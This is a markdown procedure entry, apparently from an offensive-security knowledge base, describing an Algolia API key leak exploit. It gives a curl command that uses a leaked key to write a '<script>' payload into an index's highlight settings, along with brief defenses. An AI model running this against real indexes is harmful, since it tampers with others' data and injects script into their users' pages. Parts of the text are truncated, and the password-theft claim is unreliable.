---
id: ea51326e-3980-4a35-8ca7-5dbbb0df08d8
name: Algolia API Key Leak Exploit
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:51.184185+00:00'
updated_at: '2023-04-10T20:21:07.506295+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Unsecured Credentials|T1552 - Unsecured Credentials]]'
sub_techniques:
- '[[Private Keys|T1552.004 - Private Keys]]'
tags:
- '[[Algolia]]'
- '[[API Key Leaks]]'
- '[[Exploit]]'
commands:
- '[[Update Algolia Index Settings]]'
---

# Algolia API Key Leak Exploit

## Summary

The Algolia API Key Leak Exploit is a technique that can be used to takeover accounts or extract personal information from the API using the leaked token. Algolia is a search-as-a-service platform that provides a search API for websites and mobile applications. Algolia API Keys are used to authenti

## Description

# Description

The Algolia API Key Leak Exploit is a technique that can be used to takeover accounts or extract personal information from the API using the leaked token. Algolia is a search-as-a-service platform that provides a search API for websites and mobile applications. Algolia API Keys are used to authenticate requests to the API. If an attacker obtains an API key, they can use it to access and manipulate the data stored in the Algolia search index.

To exploit this vulnerability, an attacker needs to find an API key that has been leaked or stolen. Once they have the key, they can use it to make requests to the Algolia API and extract sensitive data. This technique can be used to extract user data, passwords, and other sensitive information from websites and mobile applications that use Algolia for search functionality.

 

## Requirements

1. Access to a leaked Algolia API key

 

## Defense

1. Use strong authentication mechanisms to protect Algolia API keys

1. Encrypt sensitive data stored in the Algolia search index

1. Monitor for unauthorized access to the Algolia search index

 

## Objectives

1. To extract personal information from the Algolia API using a leaked token

1. To takeover accounts

 

# Instructions

1. Replace <application-id>, <example-index>, and <example-key> with the appropriate values.

 



**Code**: [[curl --request PUT \
  --url https://<application-]]



> The command uses the cURL tool to make a PUT request to the Algolia API. The request includes the URL of the index to be updated, the API key, and the application ID. The data parameter of the request specifies the new settings for the index. In this case, the highlightPreTag parameter is set to a malicious script that can be used to extract data from the index.



**Command** ([[Update Algolia Index Settings]]):

```bash
curl --request PUT \
  --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings \
  --header 'content-type: application/json' \
  --header 'x-algolia-api-key: <example-key>' \
  --header 'x-algolia-application-id: <example-application-id>' \
  --data '{"highlightPreTag": "<script>alert(1);</script>"}'
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Unsecured Credentials|T1552 - Unsecured Credentials]]

### Sub-Techniques

- [[Private Keys|T1552.004 - Private Keys]]

## Commands Used

- [[Update Algolia Index Settings]]

## Tags

- [[Algolia]]
- [[API Key Leaks]]
- [[Exploit]]


